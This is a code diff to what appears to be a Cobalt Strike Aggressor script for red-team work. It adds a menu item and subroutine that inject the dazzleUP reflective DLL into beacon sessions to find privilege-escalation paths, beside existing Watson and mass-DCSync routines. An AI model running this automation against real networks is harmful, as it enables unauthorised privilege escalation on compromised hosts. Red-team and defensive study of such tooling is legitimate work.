@@ -210,6 +210,19 @@ item "Run Watson to find missing patches  - T1082"{
 			escalateprivs($bid);
 		}
 	}
+	
+#################################################
+
+# Run DazzleUp to find privilege Escalation
+
+#################################################
+
+item "Run DazzleUp to find privilege Escalation"{
+	local('$bid');
+		foreach $bid ($1){
+			dazzleup($bid);
+		}
+	}
 
 #################################################
 
@@ -509,6 +522,15 @@ sub mass-dcsync {
 #################################################
 sub escalateprivs{
 bexecute_assembly($1, script_resource('/exe/Watson.exe'));
+}
+
+#################################################
+
+#   Run DazzleUp To escalate Privileges
+
+#################################################
+sub dazzleup{
+bdllspawn($1, script_resource("exe/dazzleUP_Reflective_DLL.dll"), $2, "dazzleUP", 5000, false);
 }
 
 #################################################
